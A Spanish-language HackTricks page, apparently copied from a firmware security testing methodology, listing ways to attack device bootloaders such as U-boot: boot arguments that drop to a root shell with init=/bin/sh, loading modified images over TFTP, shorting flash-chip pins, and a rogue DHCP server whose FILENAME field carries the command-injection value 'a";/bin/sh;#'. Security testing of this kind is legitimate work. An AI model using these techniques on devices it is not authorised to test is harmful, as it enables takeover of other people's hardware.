<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Copiado de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Cuando modifiques el arranque de dispositivos y bootloaders como U-boot, intenta lo siguiente:

* Intenta acceder al intérprete de shell del bootloader presionando "0", espacio u otros "códigos mágicos" identificados durante el arranque.
* Modifica configuraciones para ejecutar un comando de shell, como agregar '`init=/bin/sh`' al final de los argumentos de arranque
* `#printenv`
* `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
* `#saveenv`
* `#boot`
* Configura un servidor tftp para cargar imágenes a través de la red localmente desde tu estación de trabajo. Asegúrate de que el dispositivo tenga acceso a la red.
* `#setenv ipaddr 192.168.2.2 #IP local del dispositivo`
* `#setenv serverip 192.168.2.1 #IP del servidor tftp`
* `#saveenv`
* `#reset`
* `#ping 192.168.2.1 #verifica si el acceso a la red está disponible`
* `#tftp ${loadaddr} uImage-3.6.35 #loadaddr toma dos argumentos: la dirección donde cargar el archivo y el nombre del archivo de la imagen en el servidor TFTP`
* Usa `ubootwrite.py` para escribir la imagen de uboot y empujar un firmware modificado para obtener root
* Verifica si están habilitadas características de depuración como:
* registro detallado
* carga de kernels arbitrarios
* arranque desde fuentes no confiables
* \*Usa precaución: Conecta un pin a tierra, observa la secuencia de arranque del dispositivo, antes de que el kernel se descomprima, cortocircuita/conecta el pin a tierra a un pin de datos (DO) en un chip de flash SPI
* \*Usa precaución: Conecta un pin a tierra, observa la secuencia de arranque del dispositivo, antes de que el kernel se descomprima, cortocircuita/conecta el pin a tierra a los pines 8 y 9 del chip de flash NAND en el momento en que U-boot descomprime la imagen UBI
* \*Revisa la hoja de datos del chip de flash NAND antes de cortocircuitar pines
* Configura un servidor DHCP malicioso con parámetros maliciosos como entrada para que un dispositivo los ingiera durante un arranque PXE
* Usa el servidor auxiliar DHCP de Metasploit (MSF) y modifica el parámetro '`FILENAME`' con comandos de inyección de comandos como `‘a";/bin/sh;#’` para probar la validación de entrada en los procedimientos de arranque del dispositivo.

\*Pruebas de seguridad de hardware


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
